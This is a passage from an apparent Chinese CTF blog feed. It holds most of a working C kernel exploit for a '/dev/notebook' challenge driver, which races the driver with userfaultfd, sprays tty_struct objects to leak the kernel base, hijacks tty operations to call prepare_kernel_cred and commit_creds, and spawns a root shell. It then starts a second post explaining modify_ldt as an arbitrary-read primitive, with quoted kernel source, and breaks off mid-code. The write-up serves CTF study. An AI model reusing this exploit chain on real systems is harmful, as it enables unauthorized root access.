O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page; <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>) <span class="comment">//注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="comment">//开一个线程，接收错误的信号，然后处理</span></span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">userfaultfd_stuck_handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler created&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler unblocked&quot;</span>);</span><br><span class="line">    pause();</span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *page = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">    uc.len = <span class="number">0x1000</span>;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">long</span> <span class="keyword">int</span> idx, <span class="keyword">long</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">long</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    arg.size = size;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x100</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span> <span class="params">(<span class="keyword">long</span> <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    ioctl(fd, <span class="number">0x200</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">long</span> <span class="keyword">int</span> idx, <span class="keyword">long</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">long</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    arg.size = size;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x300</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_chunk</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x64</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *stuck_mapped_memory;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_thread</span><span class="params">(<span class="keyword">long</span> <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    edit(idx, <span class="number">0</span>, stuck_mapped_memory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_thread</span><span class="params">(<span class="keyword">long</span> <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    create(idx, <span class="number">0x60</span>, stuck_mapped_memory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tty_fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Error opening /dev/notebook\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    stuck_mapped_memory = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(stuck_mapped_memory, userfaultfd_stuck_handler);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">char</span> *buf_tty;</span><br><span class="line"></span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    buf_tty = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&quot;a&quot;</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf_tty, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    create(<span class="number">0</span>, <span class="number">0x60</span>, buf);</span><br><span class="line">    create(<span class="number">1</span>, <span class="number">0x60</span>, buf);</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x500</span>, buf);</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x2e0</span>, buf);</span><br><span class="line">    <span class="keyword">pthread_t</span> thr_edit, thr_add;</span><br><span class="line">    pthread_create(&amp;thr_edit, <span class="literal">NULL</span>, edit_thread, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pthread_create(&amp;thr_add, <span class="literal">NULL</span>, add_thread, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        tty_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (tty_fd &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ErrExit(<span class="string">&quot;[-] ptmx open failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        read(fd, buf_tty, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf_tty == <span class="number">0x100005401</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] tty_struct found! fd = %d\n&quot;</span>, tty_fd);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf_tty != <span class="number">0x100005401</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] leak failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ptm_unix98_ops_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> work_for_cpu_fn_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> prepare_kernel_cred_addr;</span><br><span class="line"></span><br><span class="line">    ptm_unix98_ops_addr = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">if</span> ((ptm_unix98_ops_addr &amp; <span class="number">0xFFF</span>) == <span class="number">0x320</span>)</span><br><span class="line">        ptm_unix98_ops_addr += <span class="number">0x120</span>;</span><br><span class="line">    kernel_base = ptm_unix98_ops_addr - <span class="number">0xe8e440</span>;</span><br><span class="line">    work_for_cpu_fn_addr = <span class="number">0x9eb90</span> + kernel_base;</span><br><span class="line">    commit_creds_addr = <span class="number">0xa9b40</span> + kernel_base;</span><br><span class="line">    prepare_kernel_cred_addr = <span class="number">0xa9ef0</span> + kernel_base;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] ptm_unix98_ops addr leaked, addr: 0x%lx\n&quot;</span>, ptm_unix98_ops_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] work_for_cpu_fn addr leaked, addr: 0x%lx\n&quot;</span>, work_for_cpu_fn_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] prepare_kernel_cred addr leaked, addr: 0x%lx\n&quot;</span>, prepare_kernel_cred_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> chunk_arr[<span class="number">0x100</span>];</span><br><span class="line">    get_chunk(chunk_arr);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> note_0_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> note_1_addr;</span><br><span class="line">    note_0_addr = chunk_arr[<span class="number">0</span> * <span class="number">2</span>];</span><br><span class="line">    note_1_addr = chunk_arr[<span class="number">1</span> * <span class="number">2</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] note_1 addr leaked, addr: 0x%lx\n&quot;</span>, note_1_addr);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty) = <span class="number">0x100005401</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">3</span> * <span class="number">8</span>) = note_1_addr;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">4</span> * <span class="number">8</span>) = prepare_kernel_cred_addr;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">5</span> * <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">    write(fd, buf_tty, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> fake_operations[<span class="number">0x100</span>];</span><br><span class="line">    fake_operations[<span class="number">7</span>] = work_for_cpu_fn_addr;</span><br><span class="line">    fake_operations[<span class="number">10</span>] = work_for_cpu_fn_addr;</span><br><span class="line">    fake_operations[<span class="number">12</span>] = work_for_cpu_fn_addr;</span><br><span class="line">    write(fd, fake_operations, <span class="number">1</span>);</span><br><span class="line">    ioctl(tty_fd, <span class="number">233</span>, <span class="number">233</span>);</span><br><span class="line"></span><br><span class="line">    read(fd, buf_tty, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] prepare_kernel_cred finished, return 0x%lx\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">6</span> * <span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty) = <span class="number">0x100005401</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">3</span> * <span class="number">8</span>) = note_1_addr;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">4</span> * <span class="number">8</span>) = commit_creds_addr;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">5</span> * <span class="number">8</span>) = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf_tty + <span class="number">6</span> * <span class="number">8</span>);</span><br><span class="line">    write(fd, buf_tty, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    ioctl(tty_fd, <span class="number">233</span>, <span class="number">233</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220816181101536.png"                      alt="image-20220816181101536"                ></p><hr><p>参考链接：<a class="link"   href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/userfaultfd/#_1" >https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/userfaultfd/#_1<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;其实这应该是kernelpwn基础中的一个，但是一直没有很关心，在最近做一道题目时又提到了这一利用方式，索性就把这玩意给先写了。&lt;/p&gt;
&lt;h3 id=&quot;简单理解&quot;&gt;&lt;a href=&quot;#简单理解&quot; class=&quot;headerlink&quot; title=&quot;简单理解&quot;&gt;&lt;/a&gt;简单</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="userfaultfd" scheme="https://cv196082.gitee.io/tags/userfaultfd/"/>
    
    <category term="tty_struct" scheme="https://cv196082.gitee.io/tags/tty-struct/"/>
    
  </entry>
  
  <entry>
    <title>modify_ldt利用</title>
    <link href="https://cv196082.gitee.io/2022/08/14/modify-ldt%E5%88%A9%E7%94%A8/"/>
    <id>https://cv196082.gitee.io/2022/08/14/modify-ldt%E5%88%A9%E7%94%A8/</id>
    <published>2022-08-14T08:37:45.000Z</published>
    <updated>2022-08-14T08:37:03.258Z</updated>
    
    <content type="html"><![CDATA[<p>在内核的堆题目中，如果不存在读取数据的函数可能是毫无头绪，因为堆块即便是free之后储存的也只是堆地址，这也没办法进行partial write等操作。那么在面对没有读取函数的情况下应该采取什么方法呢？</p><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>linux存在这样一个系统调用叫做modify_ldt，我们可以通过他获取或者修改当前进程的LDT</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="keyword">int</span> , func , <span class="keyword">void</span> __user * , ptr ,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (func) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            ret = read_ldt(ptr, bytecount);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">            ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span></span><br><span class="line"><span class="comment">     * return type, but tht ABI for sys_modify_ldt() expects</span></span><br><span class="line"><span class="comment">     * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax</span></span><br><span class="line"><span class="comment">     * for the return code.  The &#x27;unsigned&#x27; is necessary so</span></span><br><span class="line"><span class="comment">     * the compiler does not try to sign-extend the negative</span></span><br><span class="line"><span class="comment">     * return codes into the high half of the register when</span></span><br><span class="line"><span class="comment">     * taking the value from int-&gt;long.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里传入的参数有三个，分别是func，ptr，bytecount，其中ptr指针应该指向的是user_desc结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  entry_number;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  base_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  limit;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  contents:<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  useable:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">read_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> entries_size;</span><br><span class="line">    <span class="keyword">int</span> retval;</span><br><span class="line"></span><br><span class="line">    down_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!mm-&gt;context.ldt) &#123;</span><br><span class="line">        retval = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bytecount &gt; LDT_ENTRY_SIZE * LDT_ENTRIES)</span><br><span class="line">        bytecount = LDT_ENTRY_SIZE * LDT_ENTRIES;</span><br><span class="line"></span><br><span class="line">    entries_size = mm-&gt;context.ldt-&gt;nr_entries * LDT_ENTRY_SIZE;</span><br><span class="line">    <span class="keyword">if</span> (entries_size &gt; bytecount)</span><br><span class="line">        entries_size = bytecount;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">        retval = -EFAULT;</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (entries_size != bytecount) &#123;</span><br><span class="line">        <span class="comment">/* Zero-fill the rest and pretend we read bytecount bytes. */</span></span><br><span class="line">        <span class="keyword">if</span> (clear_user(ptr + entries_size, bytecount - entries_size)) &#123;</span><br><span class="line">            retval = -EFAULT;</span><br><span class="line">            <span class="keyword">goto</span> out_unlock;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    retval = bytecount;</span><br><span class="line"></span><br><span class="line">    out_unlock:</span><br><span class="line">    up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在read_ldt函数中可以看到这里有一个copy_to_user函数，可以看到如果我们可以控制<code>mm-&gt;context.ldt-&gt;entries</code>那我们即可实现任意地址的读取</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">write_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount, <span class="keyword">int</span> oldmode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>, *<span class="title">old_ldt</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> old_nr_entries, new_nr_entries;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ldt_info</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line">    <span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line">    error = -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (bytecount != <span class="keyword">sizeof</span>(ldt_info))</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    error = -EFAULT;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    error = -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (ldt_info.entry_number &gt;= LDT_ENTRIES)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    <span class="keyword">if</span> (ldt_info.contents == <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (oldmode)</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        <span class="keyword">if</span> 